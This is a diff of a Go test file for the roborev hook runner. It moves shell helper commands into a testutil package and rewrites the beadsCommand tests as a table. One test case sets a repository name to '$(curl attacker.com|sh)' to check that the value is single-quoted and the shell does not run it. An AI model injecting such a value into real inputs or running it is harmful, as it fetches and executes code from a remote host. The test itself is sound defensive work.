@@ -17,6 +17,7 @@ import (
 	"time"
 
 	"github.com/roborev-dev/roborev/internal/config"
+	"github.com/roborev-dev/roborev/internal/testutil"
 )
 
 // quote wraps a string in platform-appropriate shell quoting (matches shellEscape output).
@@ -45,12 +46,6 @@ func poll(t *testing.T, timeout time.Duration, condition func() bool) {
 	t.Fatalf("condition not met within %v", timeout)
 }
 
-// waitForFile polls for the existence of a file until the timeout expires.
-func waitForFile(t *testing.T, path string, timeout time.Duration) {
-	t.Helper()
-	waitForFiles(t, timeout, path)
-}
-
 // waitForFiles polls for the existence of multiple files until the timeout expires.
 func waitForFiles(t *testing.T, timeout time.Duration, paths ...string) {
 	t.Helper()
@@ -64,6 +59,17 @@ func waitForFiles(t *testing.T, timeout time.Duration, paths ...string) {
 	})
 }
 
+// runHookTest sets up a HookRunner, broadcasts an event, and optionally waits for files.
+func runHookTest(t *testing.T, cfg *config.Config, evt Event, waitFiles ...string) {
+	t.Helper()
+	hr, b := setupRunner(t, cfg)
+	b.Broadcast(evt)
+	if len(waitFiles) > 0 {
+		waitForFiles(t, 5*time.Second, waitFiles...)
+	}
+	hr.WaitUntilIdle()
+}
+
 // waitForFileContent polls until the file exists and has non-empty content.
 func waitForFileContent(t *testing.T, path string, timeout time.Duration) string {
 	t.Helper()
@@ -74,33 +80,6 @@ func waitForFileContent(t *testing.T, path string, timeout time.Duration) string
 		return err == nil && len(content) > 0
 	})
 	return string(content)
-}
-
-// noopCmd returns a platform-appropriate no-op shell command.
-func noopCmd() string {
-	if runtime.GOOS == "windows" {
-		return "Write-Output ok"
-	}
-	return "true"
-}
-
-// touchCmd returns a platform-appropriate shell command to create a file.
-// Uses forward slashes on Windows to avoid TOML/shell escaping issues.
-func touchCmd(path string) string {
-	if runtime.GOOS == "windows" {
-		// runHook uses PowerShell on Windows, so use PowerShell commands directly.
-		// Use forward slashes — PowerShell resolves them correctly.
-		return "New-Item -ItemType File -Force -Path '" + filepath.ToSlash(path) + "'"
-	}
-	return "touch " + path
-}
-
-// pwdCmd returns a platform-appropriate shell command to write the cwd to a file.
-func pwdCmd(path string) string {
-	if runtime.GOOS == "windows" {
-		return "[IO.File]::WriteAllText('" + filepath.ToSlash(path) + "', (Get-Location).Path)"
-	}
-	return "pwd > " + path
 }
 
 func TestMatchEvent(t *testing.T) {
@@ -295,81 +274,108 @@ func TestShellEscape(t *testing.T) {
 }
 
 func TestBeadsCommand(t *testing.T) {
-	event := Event{
-		Type:     "review.failed",
-		JobID:    7,
-		Repo:     "/home/user/myrepo",
-		RepoName: "myrepo",
-		SHA:      "abc123def456",
-		Agent:    "codex",
-		Error:    "timeout",
+	tests := []struct {
+		name      string
+		event     Event
+		checkFunc func(t *testing.T, cmd string, ev Event)
+	}{
+		{
+			name: "review failed default",
+			event: Event{
+				Type:     "review.failed",
+				JobID:    7,
+				Repo:     "/home/user/myrepo",
+				RepoName: "myrepo",
+				SHA:      "abc123def456",
+				Agent:    "codex",
+				Error:    "timeout",
+			},
+			checkFunc: func(t *testing.T, cmd string, ev Event) {
+				if cmd == "" {
+					t.Fatal("expected non-empty command for review.failed")
+				}
+				if !strings.Contains(cmd, "bd create") {
+					t.Errorf("expected bd create in command, got %q", cmd)
+				}
+				if !strings.Contains(cmd, "roborev show 7") {
+					t.Errorf("expected 'roborev show 7' in command, got %q", cmd)
+				}
+			},
+		},
+		{
+			name: "completed passing",
+			event: Event{
+				Type:    "review.completed",
+				Verdict: "P",
+			},
+			checkFunc: func(t *testing.T, cmd string, ev Event) {
+				if cmd != "" {
+					t.Errorf("expected empty command for passing review, got %q", cmd)
+				}
+			},
+		},
+		{
+			name: "completed failing",
+			event: Event{
+				Type:    "review.completed",
+				Verdict: "F",
+				JobID:   7,
+			},
+			checkFunc: func(t *testing.T, cmd string, ev Event) {
+				if cmd == "" {
+					t.Fatal("expected non-empty command for failing review")
+				}
+				if !strings.Contains(cmd, "-p 2") {
+					t.Errorf("expected priority 2 for failing review, got %q", cmd)
+				}
+				expected := fmt.Sprintf("roborev fix %d", ev.JobID)
+				if !strings.Contains(cmd, expected) {
+					t.Errorf("expected command to contain %q, got %q", expected, cmd)
+				}
+			},
+		},
+		{
+			name: "short SHA truncation",
+			event: Event{
+				Type:     "review.failed",
+				JobID:    1,
+				Repo:     "/repo",
+				RepoName: "repo",
+				SHA:      "abcdef1234567890",
+			},
+			checkFunc: func(t *testing.T, cmd string, ev Event) {
+				if !strings.Contains(cmd, "abcdef1") {
+					t.Errorf("expected truncated SHA in command, got %q", cmd)
+				}
+				if strings.Contains(cmd, "abcdef1234567890") {
+					t.Errorf("expected SHA to be truncated, got %q", cmd)
+				}
+			},
+		},
+		{
+			name: "shell escape in RepoName",
+			event: Event{
+				Type:     "review.failed",
+				JobID:    1,
+				Repo:     "/repo",
+				RepoName: "$(curl attacker.com|sh)",
+				SHA:      "abc123",
+			},
+			checkFunc: func(t *testing.T, cmd string, ev Event) {
+				if strings.Contains(cmd, `"$(curl`) {
+					t.Errorf("title must not be double-quoted; got %q", cmd)
+				}
+				if !strings.Contains(cmd, "'") {
+					t.Errorf("title should be single-quoted; got %q", cmd)
+				}
+			},
+		},
 	}
 
-	cmd := beadsCommand(event)
-	if cmd == "" {
-		t.Fatal("expected non-empty command for review.failed")
-	}
-	if !strings.Contains(cmd, "bd create") {
-		t.Errorf("expected bd create in command, got %q", cmd)
-	}
-	if !strings.Contains(cmd, "roborev show 7") {
-		t.Errorf("expected 'roborev show 7' in command, got %q", cmd)
-	}
-
-	// Completed with pass should return empty
-	event.Type = "review.completed"
-	event.Verdict = "P"
-	cmd = beadsCommand(event)
-	if cmd != "" {
-		t.Errorf("expected empty command for passing review, got %q", cmd)
-	}
-
-	// Completed with fail should return a command
-	event.Verdict = "F"
-	cmd = beadsCommand(event)
-	if cmd == "" {
-		t.Fatal("expected non-empty command for failing review")
-	}
-	if !strings.Contains(cmd, "-p 2") {
-		t.Errorf("expected priority 2 for failing review, got %q", cmd)
-	}
-	if !strings.Contains(cmd, "roborev fix 7") {
-		t.Errorf("expected 'roborev fix' hint in failing review command, got %q", cmd)
-	}
-}
-
-func TestBeadsCommandShortSHA(t *testing.T) {
-	event := Event{
-		Type:     "review.failed",
-		JobID:    1,
-		Repo:     "/repo",
-		RepoName: "repo",
-		SHA:      "abcdef1234567890",
-	}
-	cmd := beadsCommand(event)
-	if !strings.Contains(cmd, "abcdef1") {
-		t.Errorf("expected truncated SHA in command, got %q", cmd)
-	}
-	if strings.Contains(cmd, "abcdef1234567890") {
-		t.Errorf("expected SHA to be truncated, got %q", cmd)
-	}
-}
-
-func TestBeadsCommandShellEscape(t *testing.T) {
-	event := Event{
-		Type:     "review.failed",
-		JobID:    1,
-		Repo:     "/repo",
-		RepoName: "$(curl attacker.com|sh)",
-		SHA:      "abc123",
-	}
-	cmd := beadsCommand(event)
-	// Must use single quotes so the shell does not expand $()
-	if strings.Contains(cmd, `"$(curl`) {
-		t.Errorf("title must not be double-quoted; got %q", cmd)
-	}
-	if !strings.Contains(cmd, "'") {
-		t.Errorf("title should be single-quoted; got %q", cmd)
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			tt.checkFunc(t, beadsCommand(tt.event), tt.event)
+		})
 	}
 }
 
@@ -404,22 +410,11 @@ func TestResolveCommand(t *testing.T) {
 }
 
 func TestHookRunnerFiresHooks(t *testing.T) {
-
 	tmpDir := t.TempDir()
 	markerFile := filepath.Join(tmpDir, "hook-fired")
+	cfg := &config.Config{Hooks: []config.HookConfig{{Event: "review.completed", Command: testutil.TouchCmd(markerFile)}}}
 
-	cfg := &config.Config{
-		Hooks: []config.HookConfig{
-			{
-				Event:   "review.completed",
-				Command: touchCmd(markerFile),
-			},
-		},
-	}
-
-	_, broadcaster := setupRunner(t, cfg)
-
-	broadcaster.Broadcast(Event{
+	runHookTest(t, cfg, Event{
 		Type:     "review.completed",
 		TS:       time.Now(),
 		JobID:    1,
@@ -428,9 +423,7 @@ func TestHookRunnerFiresHooks(t *testing.T) {
 		SHA:      "abc123",
 		Agent:    "test",
 		Verdict:  "P",
-	})
-
-	waitForFile(t, markerFile, 5*time.Second)
+	}, markerFile)
 }
 
 func TestHookRunnerWorkingDirectory(t *testing.T) {
@@ -442,14 +435,12 @@ func TestHookRunnerWorkingDirectory(t *testing.T) {
 		Hooks: []config.HookConfig{
 			{
 				Event:   "review.failed",
-				Command: pwdCmd(markerFile),
+				Command: testutil.PwdCmd(markerFile),
 			},
 		},
 	}
 
-	_, broadcaster := setupRunner(t, cfg)
-
-	broadcaster.Broadcast(Event{
+	runHookTest(t, cfg, Event{
 		Type:     "review.failed",
 		TS:       time.Now(),
 		JobID:    1,
@@ -491,7 +482,7 @@ func TestHookRunnerNoMatchDoesNotFire(t *testing.T) {
 		Hooks: []config.HookConfig{
 			{
 				Event:   "review.completed",
-				Command: touchCmd(markerFile),
+				Command: testutil.TouchCmd(markerFile),
 			},
 		},
 	}
@@ -703,7 +694,7 @@ func TestHooksSliceNotAliased(t *testing.T) {
 	markerRepo := filepath.Join(tmpDir, "repo-fired")
 
 	globalHooks := []config.HookConfig{
-		{Event: "review.failed", Command: touchCmd(markerGlobal)},
+		{Event: "review.failed", Command: testutil.TouchCmd(markerGlobal)},
 	}
 	cfg := &config.Config{
 		Hooks: globalHooks,
@@ -714,7 +705,7 @@ func TestHooksSliceNotAliased(t *testing.T) {
 	writeRepoConfig(t, repoDir, `
 [[hooks]]
 event = "review.failed"
-command = "`+touchCmd(markerRepo)+`"
+command = "`+testutil.TouchCmd(markerRepo)+`"
 `)
 
 	_, broadcaster := setupRunner(t, cfg)
@@ -731,7 +722,7 @@ command = "`+touchCmd(markerRepo)+`"
 	})
 
 	// Wait for hooks to run
-	waitForFile(t, markerRepo, 5*time.Second)
+	waitForFiles(t, 5*time.Second, markerRepo)
 
 	// The global config's Hooks slice must still have exactly 1 element
 	if len(cfg.Hooks) != 1 {
@@ -749,7 +740,7 @@ func TestHookRunnerGlobalAndRepoHooksBothFire(t *testing.T) {
 
 	cfg := &config.Config{
 		Hooks: []config.HookConfig{
-			{Event: "review.failed", Command: touchCmd(globalMarker)},
+			{Event: "review.failed", Command: testutil.TouchCmd(globalMarker)},
 		},
 	}
 
@@ -757,7 +748,7 @@ func TestHookRunnerGlobalAndRepoHooksBothFire(t *testing.T) {
 	writeRepoConfig(t, repoDir, `
 [[hooks]]
 event = "review.failed"
-command = "`+touchCmd(repoMarker)+`"
+command = "`+testutil.TouchCmd(repoMarker)+`"
 `)
 
 	_, broadcaster := setupRunner(t, cfg)
@@ -786,7 +777,7 @@ func TestHookRunnerRepoOnlyHooks(t *testing.T) {
 	writeRepoConfig(t, repoDir, `
 [[hooks]]
 event = "review.completed"
-command = "`+touchCmd(markerFile)+`"
+command = "`+testutil.TouchCmd(markerFile)+`"
 `)
 
 	_, broadcaster := setupRunner(t, cfg)
@@ -801,7 +792,7 @@ command = "`+touchCmd(markerFile)+`"
 		Verdict: "P",
 	})
 
-	waitForFile(t, markerFile, 5*time.Second)
+	waitForFiles(t, 5*time.Second, markerFile)
 }
 
 func TestHookRunnerRepoHookDoesNotFireForOtherRepo(t *testing.T) {
@@ -817,7 +808,7 @@ func TestHookRunnerRepoHookDoesNotFireForOtherRepo(t *testing.T) {
 	writeRepoConfig(t, repoA, `
 [[hooks]]
 event = "review.failed"
-command = "`+touchCmd(markerFile)+`"
+command = "`+testutil.TouchCmd(markerFile)+`"
 `)
 
 	hr, broadcaster := setupRunner(t, cfg)
@@ -874,8 +865,8 @@ func TestHandleEventLogsWhenHooksFired(t *testing.T) {
 
 	cfg := &config.Config{
 		Hooks: []config.HookConfig{
-			{Event: "review.completed", Command: noopCmd()},
-			{Event: "review.completed", Command: noopCmd()},
+			{Event: "review.completed", Command: testutil.NoopCmd()},
+			{Event: "review.completed", Command: testutil.NoopCmd()},
 		},
 	}
 
@@ -935,7 +926,7 @@ func TestWaitUntilIdle_ConcurrentEvents(t *testing.T) {
 		Hooks: []config.HookConfig{
 			// We use a command that touches a file to verify execution.
 			// It incorporates {job_id} to ensure we can verify each individual event fired.
-			{Event: "review.completed", Command: touchCmd(filepath.Join(tmpDir, "job-{job_id}"))},
+			{Event: "review.completed", Command: testutil.TouchCmd(filepath.Join(tmpDir, "job-{job_id}"))},
 		},
 	}
 
